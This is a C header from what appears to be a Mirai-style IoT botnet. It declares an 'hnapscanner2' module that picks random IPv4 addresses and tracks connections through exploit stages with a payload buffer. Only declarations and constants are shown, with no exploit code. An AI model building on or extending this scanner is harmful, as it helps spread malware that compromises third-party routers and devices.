#pragma once

#include <stdint.h>

#include "includes.h"

#ifdef SCAN_MAX
#define hnapscanner2_SCANNER_MAX_CONNS 512
#define hnapscanner2_SCANNER_RAW_PPS 720
#else
#define hnapscanner2_SCANNER_MAX_CONNS 128
#define hnapscanner2_SCANNER_RAW_PPS 160
#endif

#ifdef SCAN_MAX
#define hnapscanner2_SCANNER_RDBUF_SIZE 1024
#define hnapscanner2_SCANNER_HACK_DRAIN 64
#else
#define hnapscanner2_SCANNER_RDBUF_SIZE 256
#define hnapscanner2_SCANNER_HACK_DRAIN 64
#endif

struct hnapscanner2_scanner_connection
{
    int fd, last_recv;
    enum
    {
        hnapscanner2_SC_CLOSED,
        hnapscanner2_SC_CONNECTING,
        hnapscanner2_SC_EXPLOIT_STAGE2,
        hnapscanner2_SC_EXPLOIT_STAGE3,
    } state;
    ipv4_t dst_addr;
    uint16_t dst_port;
    int rdbuf_pos;
    char rdbuf[hnapscanner2_SCANNER_RDBUF_SIZE];
    char payload_buf[1024];
};

void hnapscanner2_scanner_init();
void hnapscanner2_scanner_kill(void);

static void hnapscanner2_setup_connection(struct hnapscanner2_scanner_connection *);
static ipv4_t hnapscanner2_get_random_ip(void);
